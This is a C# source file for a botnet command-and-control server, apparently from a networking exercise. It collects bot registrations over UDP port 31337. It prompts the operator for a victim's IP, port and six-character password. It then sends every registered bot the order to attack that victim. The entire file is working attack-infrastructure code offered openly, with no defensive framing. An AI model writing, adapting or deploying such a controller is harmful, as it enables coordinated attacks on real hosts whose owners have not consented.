using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

using System.Net.Sockets;
using System.Net;

namespace Command_and_Control
{
    class CnCserver
    {
        public string Name { get; }
        private HashSet<Tuple<IPAddress, int>> botNet; //tuple<IP, port>
        private const short botsPort = 31337;
        private UdpClient udpListener;
        private IPEndPoint endPoint;

        public CnCserver()
        {
            Name = "Botonolovella";
            botNet = new HashSet<Tuple<IPAddress, int>>();

            StartServer();
        }

        private void StartServer()
        {
            endPoint = new IPEndPoint(IPAddress.Any, botsPort);
            udpListener = new UdpClient(endPoint);
            Console.WriteLine("Command and Control server " + Name + " active");
            Console.WriteLine();
            Console.WriteLine("to initiate an attack click: 'a'");
            Console.WriteLine();

            new Thread(ListenBots).Start();
        }

        private void ListenBots()
        {
            try
            {
                while (true)
                {
                    byte[] bot_data = udpListener.Receive(ref endPoint); // blocking call
                    string botPort = Encoding.UTF8.GetString(bot_data);
                    botNet.Add(new Tuple<IPAddress, int>(endPoint.Address, Convert.ToInt32(botPort)));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public void AttackVictim()
        {
            string ip, port, password;
            Console.WriteLine();
            Console.WriteLine(">> Enter victim details:");

            Console.Write(">> ip = "); ip = Console.ReadLine();
            IPAddress tmp;
            int iTmp;
            if (!IPAddress.TryParse(ip, out tmp))
            {
                while (true)
                {
                    Console.Write(">> illegal ip. re-enter: ");
                    ip = Console.ReadLine();
                    if (IPAddress.TryParse(ip, out tmp))
                        break;
                }
            }

            Console.Write(">> port = "); port = Console.ReadLine();
            if(!Int32.TryParse(port, out iTmp))
            {
                while (true)
                {
                    Console.Write(">> illegal port. re-enter: ");
                    port = Console.ReadLine();
                    if (Int32.TryParse(port, out iTmp))
                        break;
                }
            }
            else if(Int32.TryParse(port, out iTmp))
            {
                if(iTmp <1025 || iTmp > 65535)
                {
                    while (true)
                    {
                        Console.Write(">> illegal port. re-enter: ");
                        port = Console.ReadLine();
                        if (Int32.TryParse(port, out iTmp) && (iTmp >=1025 && iTmp<=65535))
                            break;
                    }
                }
            }

            Console.Write(">> password = "); password = Console.ReadLine();
            if (password.Length != 6)
            {
                bool passNotValid = true;
                while (passNotValid)
                {
                    Console.Write(">> illegal password. re-enter: ");
                    password = Console.ReadLine();
                    if (password.Length == 6)
                        break;
                }
            }
            Console.WriteLine();
            Console.WriteLine("Attacking victim on IP " + ip + ", port " + port + " with " + botNet.Count + " bots");

            // ATTACK!!!!!!!!
            ActivateBots(ip, port, password);
        }

        private void ActivateBots(string ip, string port, string password)
        {
            foreach (Tuple<IPAddress, int> bot in botNet)
            {
                UdpClient activateBot = new UdpClient();
                activateBot.Connect(bot.Item1, bot.Item2);
                byte[] data = Encoding.UTF8.GetBytes(ip + "," + port + "," + password + "," + Name);
                activateBot.Send(data, data.Length); //send to ListenAndAttack in Bot
                activateBot.Close();
            }
        }
    }
}
